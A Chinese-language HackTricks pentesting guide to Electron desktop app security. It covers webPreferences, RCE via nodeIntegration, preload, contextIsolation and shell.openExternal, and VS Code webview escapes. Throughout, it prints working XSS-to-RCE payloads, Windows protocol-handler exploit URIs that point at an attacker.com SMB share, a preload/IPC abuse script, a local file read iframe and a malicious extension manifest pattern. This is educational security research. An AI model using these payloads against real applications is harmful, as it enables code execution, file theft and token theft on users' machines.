# Electron 桌面应用

{{#include ../../banners/hacktricks-training.md}}

## 介绍

Electron 将具有特权的 **Node.js** 主进程与 **Chromium** 渲染进程结合起来。Electron 不是 Web 浏览器：应用代码可以有意暴露文件系统和 shell 访问等功能，因此加载不受信任的内容时，需要比普通网站更严格地设计边界。<sup>[[21]](#references)</sup>

Electron 应用代码通常打包在 `.asar` 归档中。检查源代码前，先将其解压：

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

应用程序的 `package.json` 会标明其主入口点。该文件通常会创建渲染器窗口，并设置其中与安全相关的 `webPreferences`】【。

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron 有两种主要的进程类型：

- 主进程（Main Process）（可完整访问 NodeJS）
- 渲染进程（Renderer Process）（出于安全原因，应限制其对 NodeJS 的访问）

![Electron 桌面应用 - 简介：渲染进程（Renderer Process）（出于安全原因，应限制其对 NodeJS 的访问）](<../../images/image (182).png>)

**渲染进程**会是一个加载文件的浏览器窗口：<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**主进程**会为每个渲染进程配置设置，通常是在构造 `BrowserWindow` 时进行配置。安全设置可以降低渲染进程遭到入侵后进一步实现原生代码执行的可能性，但不能让不可信内容本身变得安全。<sup>[[21]](#references)[[22]](#references)</sup>

至少检查以下渲染进程首选项：<sup>[[22]](#references)</sup>

- **`nodeIntegration`** 默认值为 `false`。启用后，渲染进程中的 JavaScript 可以访问 Node.js API，同时也会禁用该渲染进程的沙箱。
- **`contextIsolation`** 默认值为 `true`。它会将页面的 JavaScript 上下文与 preload 脚本及 Electron 内部使用的上下文隔离。
- **`preload`** 默认路径为空。配置的 preload 脚本会在页面脚本之前运行，并可通过 `contextBridge` 暴露范围有限的 API。
- **`sandbox`** 自 Electron 20 起默认值为 `true`。它会限制渲染进程对操作系统资源的访问；设置 `nodeIntegration: true` 会将其禁用。
- **`nodeIntegrationInWorker`** 默认值为 `false`，用于控制 Web Workers 中的 Node.js 集成。
- **`nodeIntegrationInSubFrames`** 默认值为 `false`。
  - 如果启用了 **`nodeIntegration`**，则允许在 Electron 应用中加载于 **iframe** 内的网页使用 **Node.js API**。
  - 如果禁用了 **`nodeIntegration`**，则 preload 脚本会在 iframe 中加载

配置示例：

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

一些 **RCE payloads** 来自 [这里](https://7as.es/electron/nodeIntegration_rce.txt)：<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### 抓取流量

修改 start-main 配置，并添加使用 proxy，例如：

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## 使用 REA 静态追踪 ASAR 到 native 的边界

**REA** 可以读取 ASAR 或提取后的应用目录，而无需执行其 JavaScript bootstrap。其应用图会记录 package 入口点、打包模块、`BrowserWindow` 和 preload 设置、`contextBridge` 成员、IPC 注册、native add-on 请求以及 source map 标识。这为追踪 renderer 暴露的功能，并定位到特权 main process 处理程序，提供了一个起点。<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

对于字面特征字符串，将完整的 Evidence 记录作为 application 传入，并将 seed 替换为目标中观察到的值：<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

同一个 `trace_application_feature` workflow 也接受观测到的字面 API 成员、IPC channel 或模块作为 seed。根据返回的源码位置检查生成的 handler 路径、验证候选项和 native handoff。renderer 的 `invoke` 只能与同一精确字面 channel 上唯一的 `ipcMain.handle`/`handleOnce` 候选项配对；`send` 同样需要唯一的 `ipcMain.on`/`once`/`addListener` 候选项。动态或重复的 handler 仍无法确定。请求的 `.node` 成员并不代表已验证的 native export；要得出该结论，匹配的 Hopper/Ghidra Evidence 必须具有相同的 artifact digest。静态可达性也不能证明该路径实际执行过。<sup>[[24]](#references)[[25]](#references)</sup>

关于 renderer 到 main 的信任边界和 handler 验证，请参阅 [Electron 通过 IPC 实现 contextIsolation RCE](electron-contextisolation-rce-via-ipc.md)。

关于面向 provider 的 native 后续分析，请参阅 [逆向工具与基本方法](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea)。

## Electron 自动更新攻击面

关于 release feed 完整性、回滚、签名 channel 混淆和 staging 文件 TOCTOU，请参阅 [Electron 自动更新信任边界](electron-auto-update-trust-boundaries.md)。

## Electron 本地代码注入

如果可以对已安装的应用进行本地写入或插桩，请参阅 [Electron 本地代码注入与快照篡改](electron-local-code-injection-and-snapshot-tampering.md)，了解 ASAR/main process 和 V8 snapshot 路径，以及特定操作系统的链接。

## RCE: XSS + nodeIntegration

如果 **nodeIntegration** 设置为 **on**，网页的 JavaScript 只需调用 `require()`，就能轻松使用 Node.js 功能。例如，在 Windows 上执行 calc 应用的方法是：

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

此设置中指定的脚本会**在渲染进程中的其他脚本之前加载**，因此它可以**无限制访问 Node API**：

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

因此，脚本可以将 node-features 导出到页面：

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **如果 `contextIsolation` 已启用，此方法将不起作用**

## RCE：XSS + contextIsolation

_**contextIsolation**_ 会在网页脚本与 Electron 内部代码的 JavaScript 之间引入**相互隔离的上下文**，使各自的 JavaScript 执行不会相互影响。这是消除 RCE 可能性的必要功能。

如果上下文未隔离，攻击者可以：

1. 在渲染进程中执行**任意 JavaScript**（XSS 或导航到外部网站）
2. **覆盖** preload 或 Electron 内部代码中使用的内置方法，将其替换为攻击者自己的函数
3. **触发**被**覆盖函数**的调用
4. RCE？

内置方法有两个可能被覆盖的位置：preload 代码或 Electron 内部代码：


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### 绕过点击事件限制

如果点击链接时受到限制，可以尝试**使用鼠标中键点击**，而不是常规的鼠标左键点击，从而绕过限制。

```javascript
window.addEventListener('click', (e) => {
```

## 通过 shell.openExternal 实现 RCE

有关这些示例的更多信息，请查看 [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) 和 [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

部署 Electron 桌面应用程序时，确保 `nodeIntegration` 和 `contextIsolation` 设置正确至关重要。已经证实，启用这些设置后，可以有效阻止从主进程针对 preload 脚本或 Electron 原生代码发起的**客户端远程代码执行（RCE）**。

用户与链接交互或打开新窗口时，会触发特定的事件监听器；这些监听器对应用程序的安全性和功能至关重要：

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

这些监听器会被**桌面应用程序重写**，以实现其自身的**业务逻辑**。应用程序会判断导航链接应在内部打开，还是在外部 Web 浏览器中打开。通常通过 `openInternally` 函数进行判断。如果该函数返回 `false`，则表示应使用 `shell.openExternal` 函数在外部打开该链接。

**以下是简化的伪代码：**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS 安全最佳实践建议不要将不可信内容传递给 `openExternal` 函数，因为这可能通过各种协议导致 RCE。操作系统支持的不同协议可能会触发 RCE。有关此主题的详细示例和进一步说明，请参阅[此资源](https://positive.security/blog/url-open-rce#windows-10-19042)，其中包含可能利用此漏洞的 Windows 协议示例。<sup>[[10]](#references)</sup>

在 macOS 中，可以利用 `openExternal` 函数执行任意命令，例如 `shell.openExternal('file:///System/Applications/Calculator.app')`。

**Windows 协议利用示例包括：**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + 易受攻击的 preload IPC + shell.openExternal

此漏洞可在**[这份报告](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**中找到。<sup>[[11]](#references)</sup>

**webviewTag** 是一项**已弃用的功能**，允许在**渲染进程**中使用 **NodeJS**。由于它允许在 preload 上下文中加载脚本，因此应将其禁用，例如：

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

因此，成功加载任意页面的攻击者可以利用该标签来 **加载任意 preload script**。

随后，这个 preload script 被滥用来调用一个**存在漏洞的 IPC 服务（`skype-new-window`）**，该服务会调用 **`shell.openExternal`**，从而获取 RCE：

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## 读取内部文件：XSS + contextIsolation

**禁用 `contextIsolation` 后即可使用 `<webview>` 标签**，其用途类似于 `<iframe>`，可用于读取和外传本地文件。以下示例展示了如何利用此漏洞读取内部文件的内容：<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - 读取内部文件：XSS + contextIsolation：禁用 contextIsolation 后即可使用 <webview> 标签，其用途类似于 <iframe>，用于...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

此外，还介绍了另一种**读取内部文件**的方法，指出 Electron 桌面应用中存在严重的本地文件读取漏洞。该方法通过注入脚本来利用应用并外传数据：

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + 旧版 Chromium**

如果应用程序捆绑的 **Chromium** 版本较旧且存在已知漏洞，就可能利用该漏洞将 XSS 转化为 RCE。<sup>[[20]](#references)</sup>\
你可以在这篇 **writeup** 中查看示例：[https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **通过绕过内部 URL 正则表达式进行 XSS 钓鱼**

如果你发现了 XSS，但**无法触发 RCE 或窃取内部文件**，仍然可以尝试**通过钓鱼窃取凭据**。<sup>[[1]](#references)</sup>

首先，检查前端代码，确定打开新 URL 时会发生什么：

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

对 **`openInternally`** 的调用会决定平台链接是在**桌面窗口**中打开，还是第三方资源在系统浏览器中打开。

如果函数的 URL allowlist 正则表达式可以被绕过（例如，主机名中的点未转义），攻击者就可能利用 XSS，在攻击者控制的基础设施上打开一个极具迷惑性的凭据提示：

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` 协议

如[Electron 安全指南](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols)所述，运行在 **`file://`** 上的页面拥有广泛的文件访问权限。因此，**XSS 可能被用于加载**用户机器上的任意文件。设计得当的**自定义协议**可以将访问限制在特定文件范围内。<sup>[[21]](#references)</sup>

有关桌面助手预览中另一种针对 worker 上下文的文件范围绕过，请参阅 [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope)。

## Remote 模块

Electron Remote 模块允许 **renderer 进程访问 main 进程 API**，从而促进 Electron 应用内部的通信。然而，启用此模块会带来重大的安全风险。它会扩大应用的攻击面，使其更容易受到跨站脚本（XSS）攻击等漏洞的影响。

> [!TIP]
> 虽然 **remote** 模块会向 renderer 进程开放 main 进程中的一些 API，但仅滥用这些组件并不容易直接实现 RCE。不过，这些组件可能会暴露敏感信息。

> [!WARNING]
> 许多仍在使用 remote 模块的应用，其使用方式**要求在 renderer 进程中启用 NodeIntegration**，这会带来**巨大的安全风险**。

Electron 内置的 `remote` 模块已弃用，之后也已移除；仍需使用其模型的应用可以使用独立的 `@electron/remote` 包。鉴于其安全和性能影响，请避免向不受信任的 renderer 暴露类似 remote 的功能。

使用 `@electron/remote` 时，必须先在 main 进程中**初始化**：

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

渲染进程随后可以从该模块导入对象：

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[博客文章](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**指出了 remote 模块中的 **`app`** 对象公开的一些有趣**函数**：<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - 通过**退出**当前实例并**启动**一个新实例来**重启**应用程序。适用于**应用更新**或重要的**状态更改**。
- **`app.setAppLogsPath([path])`**  
   - **定义**或**创建**用于存储**应用日志**的目录。可以使用 **`app.getPath()`** 或 **`app.setPath(pathName, newPath)`** **获取**或**修改**日志。
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - 将当前可执行文件**注册**为指定**协议**的**默认处理程序**。如有需要，可以提供**自定义路径**和**参数**。
- **`app.setUserTasks(tasks)`**  
   - 将任务**添加**到（Windows 上）Jump List 中的 **Tasks 类别**。每项任务都可以控制应用的**启动方式**或传递哪些**参数**。
- **`app.importCertificate(options, callback)`**  
   - 将 **PKCS#12 证书****导入**系统的**证书存储**（仅限 Linux）。可以使用 **callback** 处理结果。
- **`app.moveToApplicationsFolder([options])`**  
   - 将应用程序**移动**到（macOS 上的）**Applications 文件夹**。这有助于确保 Mac 用户获得**标准安装**。
- **`app.setJumpList(categories)`**  
   - 在 **Windows** 上**设置**或**移除**自定义 **Jump List**。你可以指定**类别**，以组织向用户显示任务的方式。
- **`app.setLoginItemSettings(settings)`**  
   - **配置**哪些**可执行文件**会在**登录时**启动，以及它们的**选项**（仅限 macOS 和 Windows）。
  
示例：

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences 模块

用于访问系统偏好设置和**触发系统事件**的**主要 API**。**subscribeNotification**、**subscribeWorkspaceNotification**、**getUserDefault** 和 **setUserDefault** 等方法都**属于**此模块。

**示例用法：**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **监听**使用 NSDistributedNotificationCenter 的 **macOS 原生通知**。  
* 在 **macOS Catalina** 之前，将 **nil** 传递给 CFNotificationCenterAddObserver，即可嗅探**所有**分布式通知。  
* 在 **Catalina / Big Sur** 之后，沙盒应用仍可通过按名称注册通知来**订阅**许多**事件**（例如**屏幕锁定/解锁**、**卷挂载**、**网络活动**等）。

### **getUserDefault / setUserDefault**

* 与 **NSUserDefaults** 交互，它用于在 macOS 上存储**应用**或**全局**偏好设置。
    
* **getUserDefault** 可以检索敏感信息，例如**最近使用的文件位置**或**用户的地理位置**。
    
* **setUserDefault** 可以修改这些偏好设置，可能会影响应用的**配置**。
    
* 在较旧的 Electron 版本（v8.3.0 之前）中，只能**访问** NSUserDefaults 的**标准套件**。

## Shell.showItemInFolder

此函数会在文件管理器中显示给定文件。在受影响的平台和版本上，此交互**可能会自动执行该文件**。

更多信息请参阅 [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## 内容安全策略

Electron 应用应设置**内容安全策略（CSP）**，以**防止 XSS 攻击**。**CSP** 是一项**安全标准**，有助于**阻止**浏览器**执行**不可信代码。

通常在 **`main.js`** 文件或 **`index.html`** 模板中通过 **meta 标签**配置 **CSP**。

更多信息请参阅：


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE：Webview CSP + postMessage 信任 + 本地文件加载（VS Code 1.63）

这一真实攻击链影响了 Visual Studio Code 1.63（CVE-2021-43908），展示了当 CSP、postMessage 和 scheme handler 配置不当时，如何将由 markdown 驱动的单个 webview XSS 升级为完整 RCE。公开 PoC：https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

攻击链概览
- 通过 webview CSP 实现首次 XSS：生成的 CSP 包含 `style-src 'self' 'unsafe-inline'`，允许在 `vscode-webview://` 上下文中进行内联/基于样式的注入。该 payload 向 `/stealID` 发送信标，以窃取目标 webview 的 extensionId。
- 构造目标 webview URL：利用 leaked ID 构造 `vscode-webview://<extensionId>/.../<publicUrl>`。
- 通过 postMessage 信任实现第二次 XSS：外层 webview 信任 `window.postMessage`，却没有严格检查来源/类型，并加载启用了 `allowScripts: true` 的攻击者 HTML。
- 通过 scheme/path 重写加载本地文件：payload 将 `file:///...` 重写为 `vscode-file://vscode-app/...`，并将 `exploit.md` 替换为 `RCE.html`，利用薄弱的路径验证加载具有特权的本地资源。
- 在启用 Node 的上下文中实现 RCE：加载的 HTML 在可使用 Node API 的环境中执行，从而实现 OS 命令执行。

最终上下文中的 RCE 原语示例
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

postMessage 信任问题的相关阅读：

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev：合成 webview 快捷键 + 声明式扩展命令桥接

2026 年 6 月出现了一类不同的 VS Code webview 逃逸：**notebook/preview webview 中的不可信 JavaScript 可以合成特权全局快捷键**，因为 webview preload 会将 `keydown` 数据转发给宿主 workbench，而宿主会将其作为真实用户输入处理。<sup>[[14]](#references)</sup>

这是 IDE 信任边界攻击更广泛历史的一部分，在这类攻击中，项目控制的内容会触及特权编辑器功能。<sup>[[19]](#references)</sup>

### 边界失效

如果跨源/沙箱化 webview 将攻击者控制的键盘字段（`key`、`code`、`keyCode`、修饰键、`repeat`）复制到特权 `postMessage`/message-port 桥接中，**却不检查 `event.isTrusted`**，那么 webview 中的 JavaScript 就能执行 workbench 快捷键：<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

当浏览器**阻止 synthetic typing** 时，这尤其有用。脚本化键盘事件通常**无法向 HTML `<input>` 元素输入任意文本**，但仍能触发直接处理 `keydown` 的快捷键。

### 实际滥用模式

- **滥用快捷键导向的 UI：**利用全局快捷键，例如接受通知、导航命令面板、激活获得焦点的按钮或移动菜单，而不是尝试输入命令。
- **利用工作区元数据触发可预测的特权提示：**由仓库控制的 `.vscode/extensions.json` 可以推荐攻击者扩展，并生成可通过 `Ctrl+Shift+A` 等快捷键接受的、可预测的安装通知。
- **将声明式扩展清单用作命令桥接：**即使 web VS Code 中的本地工作区扩展代码被 CSP 阻止，声明式 `package.json` 贡献项仍可能加载。`.vscode/extensions` 下的本地扩展可以注册一个调用 `runCommands` 的快捷键绑定，随后调用 `workbench.extensions.installExtension` 等特权内部命令。<sup>[[14]](#references)[[18]](#references)</sup>

清单示例模式：

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **可通过不可信元数据触发的隐藏安全标志：**如果内部命令接受攻击者可控的参数，例如 `{"context":{"skipPublisherTrust":true}}`，声明式元数据就可能跳过信任对话框，并安装由 Marketplace/CDN 托管的扩展，最终执行攻击者代码。
- **滥用受信任的工作区：**如果远程/网页工作区会自动被信任，本地工作区扩展就会成为从仓库内容触发特权编辑器操作的重要桥梁。
- **入侵后的影响范围扩大：**扩展执行后，应检查编辑器向扩展开放了哪些令牌。在 `github.dev` 中，窃取的 GitHub token 不仅对已打开的仓库有效，因此攻击者查询 `https://api.github.com/user/repos` 就能枚举其他可访问的私有仓库。

### 审计注意事项

- 将 **webview 到 host 的输入转发**视为权限边界；切勿将来自不可信 frame 的合成按键/点击事件重新分发到 host。
- 在敏感命令内部实施授权。不要接受调用方提供的命令上下文，以免其设置 `skipPublisherTrust` 等内部标志。
- 不要假设只要阻止可执行的本地扩展代码就足够；还要审查工作区控制的清单中的**声明式贡献项**（`keybindings`、`menus`、`commands`、任务）。
- 2026 年 6 月 3 日的修复为转发的事件添加了 `isTrusted`，禁用了 notebook webview 中不可信的按键转发，并停止接受调用方提供的安装命令上下文。<sup>[[16]](#references)[[17]](#references)</sup>

## **工具**

精选的 **awesome-electronjs-hacking** 合集提供了更多研究资料、工具和易受攻击的应用资源。<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) 是一款用于识别 Electron 应用配置错误和安全反模式的工具。
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) 是一款用于 Electron 应用的开源 VS Code 插件，使用 Electronegativity。
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) 用于检查易受攻击的第三方库。
- [**Electro.ng**](https://electro.ng/) 是一款商业 Electron 安全分析工具。

## 实验

在 [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) 中可以找到一个用于利用易受攻击 Electron 应用的实验。<sup>[[4]](#references)</sup>

以下命令可帮助你完成该实验：

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

现有书签此前使用的地址：[Electron 桌面应用](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。整个页面的路由会重定向到此处；历史片段不再维护。

## References

- [1] [Electron 应用中的 Phishing 和 credential harvesting](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App 任意文件读取](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron：滥用缺少 context isolation 的问题 - CureCon（英文）](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [利用 XSS 和 RCE 攻击现代桌面应用 Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js 安全资源精选列表](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron APIs 滥用：攻击者的首选](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payload](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron 应用中的 1-click RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron 的 shell.openExternal() 的危险——触发远程代码执行的多种路径](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [允许任意 URL，就要做好任意代码执行的准备](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [利用 Electron 的过时功能，在知名日本聊天工具中实现 RCE](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - 远程代码执行](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - 受限模式下的远程代码执行（CVE-2021-43908）](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [通过 VS Code Webview 键盘事件注入，一键窃取 GitHub Token](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593：Webview 可在主工作台中触发任意键盘快捷键](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705：确认是否打开 notebook，并停止接受调用方提供的 installExtension context](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813：阻止 notebook webview 中以编程方式重新分发 webview keypress/click](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / 本地 workspace 扩展](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom：我如何在 2 周内攻破所有主流 IDE](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt：攻破热门桌面应用并发掘 Electron 的新攻击面](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron 安全](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA：逆向分析任何内容](https://github.com/morluto/rea)
- [24] [REA JavaScript 工件重建](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA 跨层 JavaScript 应用工作流](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
